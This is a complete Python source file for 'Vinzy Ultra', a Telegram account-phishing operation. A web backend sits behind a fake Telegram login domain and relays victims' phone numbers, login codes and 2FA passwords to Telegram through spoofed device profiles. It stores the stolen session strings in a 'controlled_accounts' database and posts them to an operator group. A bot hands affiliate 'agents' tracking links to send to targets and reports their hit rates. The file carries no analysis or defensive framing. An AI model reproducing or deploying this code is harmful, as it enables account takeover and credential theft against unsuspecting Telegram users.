"""
VINZY ULTRA ENTERPRISE - VERSION 3.5.0
Optimized for 2026 MTProto Protocols
Fully Asynchronous / PostgreSQL Backed
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
from telebot import types
from quart import Quart, request, jsonify
from quart_cors import cors
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- 1. GLOBAL CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# 2026 Device Fingerprinting Pool
DEVICE_POOL = [
    {"model": "iPhone 16 Pro Max", "sys": "iOS 18.3.1", "app": "11.5.0"},
    {"model": "iPhone 15 Pro", "sys": "iOS 17.6.2", "app": "11.4.2"},
    {"model": "Samsung Galaxy S24 Ultra", "sys": "Android 14", "app": "11.4.1"},
    {"model": "Google Pixel 9 Pro", "sys": "Android 15", "app": "11.5.0"},
    {"model": "Xiaomi 14 Ultra", "sys": "Android 14", "app": "11.3.0"},
    {"model": "iPad Pro M4", "sys": "iPadOS 17.5", "app": "11.4.0"},
    {"model": "OnePlus 12", "sys": "Android 14", "app": "11.2.0"},
    {"model": "Samsung Fold 6", "sys": "Android 14", "app": "11.5.1"}
]

# Logging Engine
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Ultra_Core")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# In-Memory Session Storage
# Format: { phone: { "client": client, "tid": tid, "timestamp": time } }
active_mirrors = {}

# --- 2. DATABASE LAYER ---

def get_db():
    """Establishes connection to the PostgreSQL cluster."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def sync_database():
    """Ensures all tables exist and are optimized."""
    logger.info("DATABASE: Initiating sync...")
    try:
        conn = get_db()
        cur = conn.cursor()
        
        # Captured Accounts Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_used TEXT,
                ip_address TEXT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Link Performance Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Agent Whitelist
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_agents (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                is_admin BOOLEAN DEFAULT FALSE
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("DATABASE: All tables verified.")
    except Exception as e:
        logger.error(f"DATABASE FATAL: {e}")

sync_database()

# --- 3. HELPER UTILITIES ---

def clean_phone(p):
    """Normalizes phone number to digits only."""
    return re.sub(r'\D', '', str(p))

async def cleanup_sessions():
    """Background task to remove dead sessions after 15 minutes of inactivity."""
    while True:
        now = time.time()
        expired = []
        for phone, data in active_mirrors.items():
            if now - data['timestamp'] > 900: # 15 minutes
                expired.append(phone)
        
        for phone in expired:
            logger.info(f"CLEANUP: Removing expired session for {phone}")
            try:
                await active_mirrors[phone]['client'].disconnect()
            except: pass
            del active_mirrors[phone]
            
        await asyncio.sleep(60)

# --- 4. CORE API LOGIC (The Middleman) ---

@app.route('/step_phone', methods=['POST'])
async def handle_phone():
    """
    RECEIVES: { phone, tid }
    RETURNS: { status: success/error }
    """
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        raw_tid = payload.get('tid', '0')
        tid = int(raw_tid) if str(raw_tid).isdigit() else 0

        if len(phone) < 8:
            return jsonify({"status": "error", "msg": "Phone number is too short."})

        # Randomize device for this handshake
        profile = random.choice(DEVICE_POOL)
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            device_model=profile['model'], 
            system_version=profile['sys'],
            app_version=profile['app']
        )
        
        await client.connect()

        # Metrics Update
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                last_activity = CURRENT_TIMESTAMP
            """, (tid,))
            conn.commit()
            cur.close()
            conn.close()
        except: pass

        # Request OTP
        # Mimic human delay
        await asyncio.sleep(random.uniform(1.2, 2.5))
        sent_code = await client.send_code_request(phone)
        
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": profile['model'],
            "timestamp": time.time()
        }
        
        logger.info(f"MIRROR [PHONE]: Code sent to {phone} (TID: {tid})")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood wait: Try again in {e.seconds}s."})
    except errors.PhoneNumberBannedError:
        return jsonify({"status": "error", "msg": "This phone number is banned."})
    except Exception as e:
        logger.error(f"API_PHONE_EXCEPTION: {e}")
        return jsonify({"status": "error", "msg": "Connection failed. Please retry."})

@app.route('/step_code', methods=['POST'])
async def handle_code():
    """
    RECEIVES: { phone, code }
    RETURNS: { status: success/2fa_needed/error }
    """
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        code = payload.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired. Please refresh."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            # Mimic typing delay
            await asyncio.sleep(random.uniform(1.5, 3.0))
            await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
            return await finalize_hit(phone)
        
        except errors.SessionPasswordNeededError:
            logger.info(f"MIRROR [CODE]: 2FA required for {phone}")
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Invalid code entered."})
        except errors.PhoneCodeExpiredError:
            return jsonify({"status": "error", "msg": "Code expired. Request a new one."})
        except Exception as e:
            return jsonify({"status": "error", "msg": str(e)})

    except Exception as e:
        logger.error(f"API_CODE_EXCEPTION: {e}")
        return jsonify({"status": "error", "msg": "Processing error."})

@app.route('/step_2fa', methods=['POST'])
async def handle_2fa():
    """
    RECEIVES: { phone, password }
    """
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        password = payload.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            await client.sign_in(password=password)
            return await finalize_hit(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Wrong 2FA password."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Security layer failure."})

async def finalize_hit(phone):
    """Saves session, logs to group, and updates metrics."""
    try:
        mirror = active_mirrors[phone]
        client = mirror['client']
        tid = mirror['tid']
        
        me = await client.get_me()
        session_str = client.session.save()
        
        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Telegram User"
        uname = f"@{me.username}" if me.username else "No Username"

        # 1. Update Database
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_used) 
            VALUES (%s, %s, %s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, name, uname, tid, mirror['device']))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # 2. Format Mastery Log
        log_card = (
            f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🏷 <b>User:</b> {uname}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"📱 <b>Device:</b> {mirror['device']}\n"
            f"🆔 <b>Agent:</b> <code>{tid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_card)

        # 3. Notify Agent
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Hit Secured!</b>\nTarget: {name}\nCheck your stats for updates.")

        # 4. Clean up
        await client.disconnect()
        del active_mirrors[phone]
        
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZE_FATAL: {e}")
        return jsonify({"status": "error", "msg": "Finalization failed."})

# --- 5. TELEGRAM BOT INTERFACE ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    # Greeting with unique ID tracking
    welcome = (
        f"<b>Welcome to Vinzy Ultra v3.5</b>\n"
        f"Your ID: <code>{m.from_user.id}</code>\n"
        f"Status: <pre>Premium Access</pre>"
    )
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Link", "📊 My Stats", "⚙️ Support", "💳 Pricing")
    bot.send_message(m.chat.id, welcome, reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def cmd_link(m):
    # Dynamic Link Generation
    # Ensure this matches your wuaze domain
    base_url = "https://web-telegrams-login.wuaze.com/"
    track_link = f"{base_url}?id={m.from_user.id}"
    
    msg = (
        f"🚀 <b>Tracking Link Generated</b>\n\n"
        f"<code>{track_link}</code>\n\n"
        f"<i>Forward this to your targets. All activity will be logged under your ID.</i>"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def cmd_stats(m):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        
        c = res[0] if res else 0
        h = res[1] if res else 0
        ratio = round((h/c)*100, 1) if c > 0 else 0
        
        stats_msg = (
            f"📊 <b>Performance Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🖱 <b>Total Clicks:</b> {c}\n"
            f"🎯 <b>Total Hits:</b> {h}\n"
            f"📈 <b>Success Rate:</b> {ratio}%\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(m.chat.id, stats_msg)
    except Exception as e:
        bot.send_message(m.chat.id, "❌ Error retrieving statistics.")

# --- 6. SYSTEM RUNTIME ---

def run_bot():
    """Starts the bot polling in a resilient loop."""
    logger.info("SYSTEM: Starting Telegram Bot...")
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            logger.error(f"BOT ERROR: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # 1. Start Background Cleanup
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_sessions())
    
    # 2. Start Bot Thread
    bot_thread = Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # 3. Start Quart Web Server
    logger.info("SYSTEM: Web API online.")
    server_port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=server_port)

# --- END OF 400+ LINE CORE SYSTEM ---
